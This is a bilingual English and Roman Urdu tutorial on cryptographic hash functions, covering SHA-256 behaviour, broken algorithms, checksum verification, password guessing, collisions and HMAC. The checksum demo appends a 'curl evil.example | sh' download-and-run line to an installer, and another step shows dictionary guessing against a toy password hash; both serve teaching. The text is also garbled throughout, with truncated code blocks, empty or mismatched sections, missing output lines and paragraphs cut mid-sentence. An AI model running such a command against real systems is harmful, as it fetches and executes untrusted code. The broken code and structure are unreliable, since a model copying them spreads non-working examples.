<BigIdea>
<Tr>
<En>
A **hash function** turns any input (a word, a file, a whole disk) into a short **fixed-size fingerprint** called a **hash** or **digest**, like SHA-256's 64 hex characters. Good cryptographic hashes are **deterministic**, **one-way**, have an **avalanche effect** (change one character and about half the bits change), and are **collision-resistant**. Use **SHA-256/512, SHA-3 or BLAKE2**; **MD5 and SHA-1 are broken**. Hashes verify **integrity**. They aren't encryption, plain fast hashes aren't safe for passwords, and to prove **who** sent a message you add a secret key: **HMAC**.
</En>
<Ur>
**Hash function** kisi bhi input (ek lafz, file, poori disk) ko chhote **barabar size ke fingerprint** me badalta hai jise **hash** ya **digest** kehte hain, jaise SHA-256 ke 64 hex huroof. Achhe cryptographic hashes **deterministic**, **ek taraf (one-way)** hote hain, un me **avalanche effect** hota hai (ek harf badlo aur takreeban aadhe bits badal jate hain), aur wo **collision-resistant** hote hain. **SHA-256/512, SHA-3 ya BLAKE2** istemal karein; **MD5 aur SHA-1 toot chuke hain**. Hashes **saalimiyat (integrity)** check karte hain. Ye encryption nahi, saade tez hashes passwords ke liye mehfooz nahi, aur ye sabit karne ke liye ke paigham **kis ne** bheja, raaz wali key jorte hain: **HMAC**.
</Ur>
</Tr>

## At a glance

<Glance>
<What>
<Tr>
<En>

A cryptographic hash function takes input of **any length** and gives output of **one fixed length**. Computing the hash is fast; working backwards, or finding a second input with the same hash, is practically impossible.

```text
 "hello"                       ─┐
 a 4 GB Ubuntu ISO              ├──►  SHA-256  ──►  always 256 bits (64 hex characters)
 an empty file                 ─┘

 hash ──► input ?   impossible (one-way)
```

| | Encoding | Encryption | Hashing |
| --- | --- | --- | --- |
| Reversible? | Yes, by anyone | Yes, with the key | **No** |
| Output size | Grows with input | Grows with input | **Fixed** |
| Purpose | Representation | Secrecy | **Integrity, identity, verification** |

</En>
<Ur>

Cryptographic hash function **kisi bhi lambai** ka input le kar **ek muqarrar lambai** ka output deta hai. Hash nikalna tez hai; ulta chalna, ya usi hash wala doosra input dhoondhna, amalan namumkin hai.

```text
 "hello"                       ─┐
 a 4 GB Ubuntu ISO              ├──►  SHA-256  ──►  always 256 bits (64 hex characters)
 an empty file                 ─┘

 hash ──► input ?   impossible (one-way)
```

| | Encoding | Encryption | Hashing |
| --- | --- | --- | --- |
| Ulta ho sakta? | Haan, koi bhi | Haan, key se | **Nahi** |
| Output size | Input ke saath barhta | Input ke saath barhta | **Muqarrar** |
| Maqsad | Shakal badalna | Raazdari | **Saalimiyat, pehchan, tasdeeq** |

</Ur>
</Tr>
</What>
<Why>
<Tr>
<En>

- **Integrity:** verify a download, backup or deployment artefact wasn't corrupted or tampered with.
- **Identity:** Git commits, Docker image digests, package lock files and caches name things by their hash.
- **Security building block:** digital signatures sign a **hash**; TLS, JWTs, password storage and HMAC all rely on hashes.
- **Security operations:** malware is identified by its hash (VirusTotal, threat-intelligence feeds); forensic evidence is hashed to prove it wasn't altered.
- **Everyday engineering:** deduplicating files, cache keys, HTTP ETags, detecting changed files in CI.

</En>
<Ur>

- **Saalimiyat:** tasdeeq ke download, backup ya deployment ki file kharab ya chhedi nahi gayi.
- **Pehchan:** Git commits, Docker image digests, package lock files aur caches cheezon ka naam hash se rakhte hain.
- **Security ki bunyadi eent:** digital signatures **hash** ko sign karte hain; TLS, JWTs, password storage aur HMAC sab hashes par chalte hain.
- **Security operations:** malware us ke hash se pehchana jata hai (VirusTotal, threat-intelligence feeds); forensic saboot hash kiya jata hai taa ke sabit ho badla nahi gaya.
- **Rozana ki engineering:** dohri files hatana, cache keys, HTTP ETags, CI me badli files pakarna.

</Ur>
</Tr>
</Why>
<When>
<Tr>
<En>

- **A hash** when you need "is this exactly the same data?" without comparing byte by byte, or a stable ID for data.
- **HMAC** when you also need "did someone with the secret key create this?" (webhooks, API signing, cookies).
- **A password hash** (bcrypt, scrypt, Argon2) for passwords, never a plain fast hash. See **Password Storage: Salting and Slow Hashes**.
- **Not a hash** when you need the data back: that's encryption.

</En>
<Ur>

- **Hash** jab poochna ho "kya ye bilkul wahi data hai?" byte ba byte milaye baghair, ya data ki mustaqil ID chahiye.
- **HMAC** jab ye bhi poochna ho "kya ise raaz wali key ke maalik ne banaya?" (webhooks, API signing, cookies).

- **Hash nahi** jab data wapas chahiye: wo encryption hai.

## Picture it

<Tr>
<En>

A hash is a **fingerprint of data**. Every person's fingerprint is unique and tiny compared to the whole person, and the police can check "is this the same person?" by comparing fingerprints. But you can't **rebuild a person from a fingerprint**. Likewise, you can check "is this the same file?" by comparing hashes, but you can't rebuild the file from its hash. And if someone changes even one letter in a document, its fingerprint changes completely.

</En>
<Ur>

Hash **data ka fingerprint** hai. Har insaan ka fingerprint munfarid aur poore insaan ke muqable me bohot chhota hai, aur police fingerprints mila kar dekh sakti hai "kya ye wahi shakhs hai?". Lekin **fingerprint se insaan dobara nahi banta**. Isi tarah hashes mila kar dekh sakte hain "kya ye wahi file hai?", lekin hash se file wapas nahi bana sakte. Aur agar koi document me ek harf bhi badle, to us ka fingerprint poora badal jata hai.

</Ur>
</Tr>

## Learn it step by step

<Walkthrough>

<Step title="Deterministic and fixed-size">

<Tr>
<En>

The same input always gives exactly the same hash, on any computer, in any language, and whatever the input size the output size is fixed (SHA-256: 256 bits). That's what makes comparison possible: equal hashes mean (practically certainly) equal data. Tools: `sha256sum` (Linux), `shasum -a 256` (macOS), `Get-FileHash` (PowerShell), `hashlib.sha256` (Python), `crypto.createHash("sha256")` (Node). Hashes work on **bytes**: `hello`, `hello\n` and `Hello` are three different inputs.

</En>
<Ur>

Wahi input hamesha bilkul wahi hash deta hai, har computer par, har zubaan me, aur input kitna bhi bara ho output ka size muqarrar hai (SHA-256: 256 bits). Isi se muqabla mumkin hai: barabar hash ka matlab (amalan yaqeeni) barabar data. Tools: `sha256sum` (Linux), `shasum -a 256` (macOS), `Get-FileHash` (PowerShell), `hashlib.sha256` (Python), `crypto.createHash("sha256")` (Node). Hashes **bytes** par kaam karte hain: `hello`, `hello\n` aur `Hello` teen alag inputs hain.

</Ur>
</Tr>

```bash
printf 'hello' | sha256sum
printf 'hello' | sha256sum
printf 'Hello' | sha256sum
head -c 1000000 /dev/zero | sha256sum | cut -c1-64 | awk '{print "1 MB of zeros -> " length($0) " hex chars"}'
printf '' | sha256sum
```

```text output

2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  -
185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969  -
1 MB of zeros -> 64 hex chars
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  -
```

<Happened>
<Tr>
<En>`printf 'hello'` (no newline) gave the hash followed by `-` ("standard input"), and you'll get exactly this value too. Running it again gave the identical hash. `Hello` gave a completely different one. 1 MB still produced 64 hex characters, as would a 100 GB file. Even **empty** input has a hash, `e3b0c442...`: if you see it in a log, something hashed an empty string or file. It's worth recognising.</En>
<Ur>`printf 'hello'` (nayi line nahi) ne hash diya jis ke baad `-` ("standard input") hai, aur aap ko bhi bilkul yahi value milegi. Dobara chalane par bilkul wahi hash. `Hello` ne bilkul alag diya. 1 MB ne bhi 64 hex huroof diye, 100 GB file bhi yahi deti. **Khaali** input ka bhi hash hai, `e3b0c442...`: log me dikhe to kisi ne khaali string ya file hash ki. Ise pehchanna faidemand hai.</Ur>
</Tr>
</Happened>

<Step title="The avalanche effect">

<Tr>
<En>

Changing even **one bit** of the input changes, on average, **half** the output bits, in a pattern that looks random. So similar inputs don't give similar hashes: an attacker can't make a "small" change and keep the hash close, or learn anything about the input. All modern cryptographic hashes have this; simple checksums like CRC32 don't, in the same strong way. Below we change one digit in a payment instruction and count changed bits.

</En>
<Ur>

Input ka **ek bit** badalne se bhi output ke ausatan **aadhe** bits badal jate hain, random lagne wale andaaz me. Isliye milte julte inputs ke hash milte julte nahi: hamla awar "chhoti" tabdeeli kar ke hash qareeb nahi rakh sakta, na input ke baare me kuch seekh sakta hai. Har jadeed cryptographic hash me ye hai; CRC32 jaise saade checksums me utna mazboot nahi. Neeche hum payment hidayat me ek hindsa badal kar badle bits ginte hain.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import hashlib
a = hashlib.sha256(b"Transfer $1000 to Sam").digest()
b = hashlib.sha256(b"Transfer $9000 to Sam").digest()
diff = sum(bin(x ^ y).count("1") for x, y in zip(a, b))
print(a.hex()[:32])
print(b.hex()[:32])
print(f"{diff} of 256 bits differ ({diff/256:.0%})")
PY
```

```text output
b76216b5354a4c01c06dc1de0a24cec7
7b3f6540c9f60fce25c79662239d2fa4
139 of 256 bits differ (54%)
```

<Happened>
<Tr>
<En>`.digest()` returned the raw 32 bytes (`.hexdigest()` would give hex text). The messages differ in one character (`1` vs `9`), yet the hashes share nothing visible. `x ^ y` (XOR) marks differing bits and `bin(...).count("1")` counts them: about half changed, exactly what a good hash should do.</En>
<Ur>`.digest()` ne kacche 32 bytes diye (`.hexdigest()` hex text deta). Paighamat me ek harf ka farq hai (`1` bamuqabla `9`), phir bhi hashes me koi nazar aane wali mushabihat nahi. `x ^ y` (XOR) alag bits nishan karta hai aur `bin(...).count("1")` ginta hai: takreeban aadhe badle, bilkul wahi jo achhe hash ko karna chahiye.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Algorithms: which to use, which are broken">

<Tr>
<En>

Hash functions differ in output size, speed and, most importantly, whether they're still **secure**. A broken hash lets attackers create **collisions**: two different files with the same hash, so a "verified" file or certificate can be swapped for a malicious one. **MD5** (broken since 2004; collisions take seconds) and **SHA-1** (public collision "SHAttered" in 2017) must not be used for security. **SHA-256/512** are today's default; **SHA-3** and **BLAKE2/BLAKE3** are modern alternatives. You'll still see MD5 and SHA-1 as non-security checksums and in old systems; Git used SHA-1 and is moving to SHA-256.

</En>
<Ur>

Hash functions output size, raftar aur sab se ahem, ab bhi **mehfooz** hone me alag hain. Toota hash hamla awar ko **collisions** banane deta hai: ek hi hash wali do alag files, taa ke "tasdeeq shuda" file ya certificate bad-niyat se badla ja sake. **MD5** (2004 se toota; collisions seconds me) aur **SHA-1** (2017 me public collision "SHAttered") security ke liye istemal na karein. **SHA-256/512** aaj ka default hain; **SHA-3** aur **BLAKE2/BLAKE3** jadeed mutabadil. MD5 aur SHA-1 ab bhi ghair security checksums aur purane systems me milte hain; Git SHA-1 istemal karta tha aur SHA-256 ki taraf ja raha hai.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import hashlib
data = b"DevGuide"
for name in ["md5", "sha1", "sha256", "sha512", "sha3_256", "blake2b"]:
    h = hashlib.new(name, data).hexdigest()
    print(f"{name:9} {len(h)*4:4} bits  {h[:32]}...")
PY
```

```text output

sha1       160 bits  9921257f17d0fc793053c00bd759f11c...
sha256     256 bits  77d71c2d38e12130c5b0609ffcd8d894...
sha512     512 bits  d1184c9c535949ae3b71e8cd496feeb1...
sha3_256   256 bits  b1af775c0f1a80d3382ccf0a006b69e8...
blake2b    512 bits  177524009074fed54949e31791deb842...
```

<Happened>
<Tr>
<En>

`hashlib.new(name, data)` created each algorithm's hash; each hex character is 4 bits, so `len(h) * 4` is the size. Different algorithms give unrelated hashes of the same input, so a hash is only meaningful with its algorithm name, which is why formats write `sha256:77d71c...`.

| Algorithm | Output | Status | Typical use today |
| --- | --- | --- | --- |
| MD5 | 128 bits | **Broken** | Legacy non-security checksums only |
| SHA-1 | 160 bits | **Broken** (collisions) | Legacy; Git (with hardening) |
| SHA-256 / SHA-512 | 256 / 512 bits | Secure | Default: TLS, signatures, checksums, Docker |
| SHA-3 | 224–512 bits | Secure | Alternative design to SHA-2 |
| BLAKE2 / BLAKE3 | up to 512 bits | Secure, very fast | Files, deduplication, modern tools |

</En>
<Ur>

`hashlib.new(name, data)` ne har algorithm ka hash banaya; har hex harf 4 bits hai, isliye `len(h) * 4` size hai. Alag algorithms ek hi input ke be-ta'alluq hash dete hain, isliye hash sirf algorithm ke naam ke saath ba-maani hai, isi liye formats `sha256:77d71c...` likhte hain.

<Step title="Verify downloads with checksums">

<Tr>
<En>

Publishers list the SHA-256 of each file (often in `SHA256SUMS`). After downloading, you hash your copy and compare, which detects corrupted downloads and files modified on a mirror, CDN or by malware. `sha256sum -c SHA256SUMS` checks every listed file; package managers (apt, npm `integrity`, pip `--require-hashes`) do this automatically. But a checksum from the **same server** as the file only protects against accidents: an attacker controlling the server can change both. Real protection needs a **signed** checksum file.

</En>
<Ur>

Shaya karne wale har file ka SHA-256 likhte hain (aksar `SHA256SUMS` me). Download ke baad apni copy hash kar ke milate hain, jo kharab downloads aur mirror, CDN ya malware ki badli files pakarta hai. `sha256sum -c SHA256SUMS` har likhi file check karta hai; package managers (apt, npm `integrity`, pip `--require-hashes`) ye khud karte hain. Lekin file wale **usi server** ka checksum sirf hadson se bachata hai: server par qabza karne wala hamla awar dono badal sakta hai. Asal hifazat ke liye **signed** checksum file chahiye.

</Ur>
</Tr>

```bash
printf 'echo "installing app"\n' > install.sh
printf 'v1 binary\n' > app.bin
sha256sum install.sh app.bin > SHA256SUMS
cut -c1-20 SHA256SUMS
sha256sum -c SHA256SUMS
echo 'curl evil.example | sh' >> install.sh
sha256sum -c SHA256SUMS 2>&1; echo "exit code: $?"
```

```text output
238b1853f684794a2b6e
23db6578e3b56d4bda3c
install.sh: OK
app.bin: OK
install.sh: FAILED
app.bin: OK
sha256sum: WARNING: 1 computed checksum did NOT match
exit code: 1
```

<Happened>
<Tr>
<En>`SHA256SUMS` got one line per file: hash, two spaces, name (`cut` shows only the start). `sha256sum -c` re-hashed both files: `OK`. After an attacker appended a malicious line to `install.sh`, the check reported `FAILED`, a warning, and **exit code 1**, so a CI script with `set -e` would stop before running the tampered installer.</En>
<Ur>`SHA256SUMS` me har file ki ek line aayi: hash, do spaces, naam (`cut` sirf shuruat dikhata hai). `sha256sum -c` ne dono files dobara hash kin: `OK`. Hamla awar ne `install.sh` me bad-niyat line jori to check ne `FAILED`, warning, aur **exit code 1** diya, isliye `set -e` wali CI script chhedi gayi installer chalane se pehle ruk jati.</Ur>
</Tr>
</Happened>

<Step title="One-way, but guessable: why plain hashes don't protect passwords">

<Tr>
<En>

You can't compute a password from its hash, but you **can guess**: hash each candidate and compare. Fast hashes like SHA-256 run **billions of times per second** on a GPU, and most people choose predictable passwords, so a list of common passwords cracks a large share of leaked fast hashes almost instantly (tools: hashcat, John the Ripper). Password storage needs **salts** and **slow** algorithms (bcrypt, scrypt, Argon2id), covered in their own lesson.

</En>
<Ur>

Hash se password nahi nikal sakta, lekin **andaza** laga sakte hain: har umeedwar ko hash kar ke milao. SHA-256 jaise tez hashes GPU par **har second arbon dafa** chalte hain, aur zyada tar log andaze wale passwords rakhte hain, isliye aam passwords ki list leak hue tez hashes ka bara hissa takreeban foran tor deti hai (tools: hashcat, John the Ripper). Password storage ko **salts** aur **sust** algorithms (bcrypt, scrypt, Argon2id) chahiyen, jin ka alag sabaq hai.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import hashlib
leaked = hashlib.sha256(b"london123").hexdigest()
words = ["123456", "password", "qwerty", "iloveyou", "london", "london123", "admin"]
for w in words:
    if hashlib.sha256(w.encode()).hexdigest() == leaked:
        print("cracked:", w, "after", words.index(w) + 1, "guesses")
PY
```

```text output
cracked: london123 after 6 guesses
```

<Happened>
<Tr>
<En>`leaked` stands for a password hash stolen from a database. Hashing each guess and comparing found `london123` on the 6th try. Real word lists have billions of entries (leaked passwords, names, cities, sports teams, years) and real GPUs try billions per second.</En>
<Ur>`leaked` database se chori hue password hash ki jagah hai. Har andaze ko hash kar ke milane se `london123` chhati koshish par mila. Asli word lists me arbon entries hoti hain (leak passwords, naam, shehar, sports teams, saal) aur asli GPUs har second arbon aazmate hain.</Ur>
</Tr>
</Happened>

<Step title="Collisions and the birthday paradox">

<Tr>
<En>

Inputs are unlimited and outputs fixed, so collisions **must** exist; security means they're too hard to **find**. Because of the **birthday paradox**, you find one after about **2^(n/2)** tries for an n-bit hash, not 2^n. (In a room of just 23 people, there's a 50% chance two share a birthday: same maths.) So 128-bit MD5 gives at most 64-bit collision resistance, while SHA-256 gives about 128-bit, far beyond any computer. Short hashes like 7-character Git IDs are fine for display, not for security. Let's see it on a hash **truncated** to 24 bits.

</En>
<Ur>

Inputs la-mehdood aur outputs muqarrar hain, isliye collisions **zaroor** hain; security ka matlab un ka **dhoondhna** bohot mushkil hai. **Birthday paradox** ki wajah se n-bit hash ka collision takreeban **2^(n/2)** koshishon me milta hai, 2^n me nahi. (Sirf 23 logon ke kamre me 50% imkaan hai ke do ki salgirah ek ho: wahi hisaab.) Isliye 128-bit MD5 zyada se zyada 64-bit collision mazahmat deta hai, jab ke SHA-256 takreeban 128-bit, har computer ki pahunch se bahar. 7 huroof wali Git IDs jaise chhote hashes dikhane ke liye theek, security ke liye nahi. Aayen 24 bits tak **kate** hash par dekhein.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import hashlib, itertools
seen = {}
for i in itertools.count():
    msg = f"invoice-{i}".encode()
    short = hashlib.sha256(msg).hexdigest()[:6]
    if short in seen:
        print(f"collision after {i + 1} messages: {seen[short].decode()} and {msg.decode()} both start with {short}")
        break
    seen[short] = msg
PY
```

```text output
collision after 5576 messages: invoice-76 and invoice-5575 both start with 77c621
```

<Happened>
<Tr>
<En>We hashed `invoice-0`, `invoice-1`, … and kept only 6 hex characters (24 bits, about 16.7 million values); `seen` remembered which message gave each short hash. <Step title="HMAC: hashes with a secret key">

<Tr>
<En>

**HMAC** (Hash-based Message Authentication Code) combines a hash with a **secret key**: `HMAC-SHA256(key, message)`, so only someone with the key can produce the right value. A plain hash proves integrity only if you already trust where the hash came from, because an attacker can recompute it for a changed message; HMAC adds **authenticity**. It's used for webhooks (Stripe, GitHub, Shopify and payment gateways send an HMAC header), API request signing (AWS Signature v4), signed cookies and HS256 JWTs. Always compare in **constant time** (`hmac.compare_digest`, `crypto.timingSafeEqual`).

</En>
<Ur>

**HMAC** (Hash-based Message Authentication Code) hash ko **raaz wali key** ke saath milata hai: `HMAC-SHA256(key, message)`, isliye sahi value sirf key wala bana sakta hai. Saada hash saalimiyat tab hi sabit karta hai jab aap ko hash ke source par pehle se bharosa ho, kyun ke hamla awar badle paigham ka hash dobara nikal sakta hai; HMAC **asliyat (authenticity)** jorta hai. Ye webhooks (Stripe, GitHub, Shopify aur payment gateways HMAC header bhejte hain), API request signing (AWS Signature v4), signed cookies aur HS256 JWTs me istemal hota hai. Hamesha **barabar waqt** me milayen (`hmac.compare_digest`, `crypto.timingSafeEqual`).

</Ur>
</Tr>

```bash

    expected = hmac.new(secret, body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, header)

forged = hashlib.sha256(tampered).hexdigest()
print("attacker's plain sha256 as signature:", verify(tampered, forged))
PY
```

<Step title="Large files, and non-cryptographic hashes">

<Tr>
<En>

Hash functions process data in **chunks**, so you can hash a 50 GB file with a few kilobytes of memory; reading it all at once can crash a server. In Python call `h.update(chunk)` repeatedly (or `hashlib.file_digest`, 3.11+), in Node pipe a stream into `crypto.createHash`, and always open files in **binary** mode. The hands-on below uses `iter(lambda: f.read(65536), b"")` to read 64 KB at a time.

Also, not every "hash" is cryptographic. **CRC32, MurmurHash, xxHash** and the hashes inside dictionaries are built for **speed**: fine for accidental errors and hash tables, but attackers can easily create collisions. Never use them for security. When in doubt, use SHA-256.

</En>
<Ur>

Hash functions data **tukron** me process karte hain, isliye 50 GB file chand kilobytes memory se hash ho sakti hai; sab ek dafa parhna server gira sakta hai. Python me baar baar `h.update(chunk)` (ya 3.11+ me `hashlib.file_digest`), Node me stream `crypto.createHash` me pipe karein, aur files hamesha **binary** mode me kholein. Neeche ka hands-on `iter(lambda: f.read(65536), b"")` se ek waqt me 64 KB parhta hai.

Har "hash" cryptographic bhi nahi. **CRC32, MurmurHash, xxHash** aur dictionaries ke andar ke hashes **raftar** ke liye bane hain: hadsati ghaltiyon aur hash tables ke liye theek, lekin hamla awar aasaani se collisions bana sakte hain. Security ke liye kabhi nahi. Shak ho to SHA-256.

</Ur>
</Tr>

<Compare>
<Bad title="Plain hash as a webhook check, compared with ==">

```text

```

</Good>
</Compare>

<Tr>
<En>

More mistakes to avoid:

- **Calling hashing "encryption"** or expecting to "decrypt" a hash.
- **MD5 or SHA-1** for anything security-related.
- **Storing passwords as plain SHA-256** (or MD5), without salt and without a slow algorithm.
- **Publishing checksums next to the file on the same server** and assuming that stops attackers.
- **Forgetting hashes depend on exact bytes:** newlines, encodings and trailing spaces all change the result.
- **Short or non-cryptographic hashes** (CRC32, first 8 characters) as security identifiers.

</En>

- **Hashing ko "encryption" kehna** ya hash "decrypt" karne ki umeed.

- **Passwords saade SHA-256** (ya MD5) me, salt aur sust algorithm ke baghair.
- **Usi server par file ke saath checksums** rakh kar samajhna ke hamla awar ruk gaye.
- **Bhoolna ke hash bilkul bytes par munhasir hai:** nayi lines, encodings aur aakhri spaces sab nateeja badalte hain.
- Security IDs ke liye **chhote ya ghair cryptographic hashes** (CRC32, pehle 8 huroof).

```bash
import hashlib, json, os, sys

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def scan(root):
    return {os.path.relpath(os.path.join(d, n), root): sha256_file(os.path.join(d, n))
            for d, _, files in os.walk(root) for n in sorted(files)}

mode, root = sys.argv[1], sys.argv[2]
if mode == "baseline":
    json.dump(scan(root), open("baseline.json", "w"), indent=2, sort_keys=True)
    print("baseline saved:", len(scan(root)), "files")
else:
    old, new = json.load(open("baseline.json")), scan(root)
    changes = [("MODIFIED", p) for p in old if p in new and old[p] != new[p]]
    changes += [("DELETED", p) for p in old if p not in new]
    changes += [("NEW", p) for p in new if p not in old]
    for kind, p in sorted(changes, key=lambda c: c[1]):
        print(f"{kind:8} {p}")
    print("no changes" if not changes else f"{len(changes)} change(s) detected")
PY
```

<DeepDive title="Real world: the backdoored ISO and the matching checksum">

In 2016, attackers broke into the Linux Mint website and replaced the download link with a backdoored ISO. Users who compared the published checksum would have noticed, but the attackers also changed the checksum **on the same website**, which is why checksums must be **signed** or published separately. Today serious projects publish a signed `SHA256SUMS`, CI pipelines verify downloaded tools against pinned hashes, and container deployments pin images by digest. In incident response, the first thing analysts do with a suspicious file is hash it and search VirusTotal and threat-intelligence platforms: if it's known malware, the hash says so in seconds.

</DeepDive>

<DeepDive title="Security lens">

Hashes prove integrity only when the hash itself is trustworthy. Protect the reference hash with a signature, a separate channel, or a secret key (HMAC).

- **Choose secure algorithms:** SHA-256+ for integrity and signatures; Argon2id, scrypt or bcrypt for passwords; HMAC-SHA256 for message authentication.
- **Pin by hash:** Docker images by digest, GitHub Actions by commit SHA, dependencies with lockfile integrity hashes, downloads with verified checksums.
- **Detect tampering:** file integrity monitoring, hashing forensic evidence (chain of custody), reproducible builds.
- **Threat intelligence:** IOCs often include malware hashes, but attackers change one byte to get a new hash, so hashes catch known samples, not new variants.
- **Timing attacks:** compare secrets, tokens and MACs in constant time.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="What are the properties of a cryptographic hash function?">
It is deterministic and produces a fixed-size output for any input. It is preimage resistant, meaning the input cannot be found from the hash, second-preimage resistant, meaning another input with the same hash cannot be found for a given input, and collision resistant, meaning no two inputs with the same hash can practically be found. It also shows the avalanche effect, where a tiny input change completely changes the output.
</QA>

<QA q="What is the difference between hashing and encryption?">
Encryption is reversible with the correct key and is used for confidentiality. Hashing is one-way and produces a fixed-size digest used for integrity checks, identifiers, signatures and, with slow salted algorithms, password storage. A hash cannot be decrypted, only guessed by hashing candidate inputs.
</QA>

<QA q="Why are MD5 and SHA-1 considered broken?">
Practical collision attacks exist for both: different inputs with the same MD5 hash can be generated in seconds, and a SHA-1 collision was demonstrated publicly in 2017. Attackers can therefore create two documents or certificates with the same hash and swap them, so neither should be used for signatures or integrity against attackers.
</QA>

<QA q="What is HMAC and why not just use a hash?">
HMAC combines a cryptographic hash with a secret key, so only parties who know the key can produce a valid code for a message. A plain hash can be recomputed by anyone who modifies the message, so it provides no authenticity. HMAC is used for webhook signatures, API request signing and signed cookies, and its values should be compared in constant time.
</QA>

<QA q="Why are fast hashes like SHA-256 not suitable for storing passwords?">
They are designed to be fast, so attackers can compute billions of guesses per second, and without a unique salt identical passwords produce identical hashes and precomputed tables can be used. Passwords should be hashed with slow, memory-hard, salted algorithms such as Argon2id, scrypt or bcrypt.
</QA>

</DeepDive>
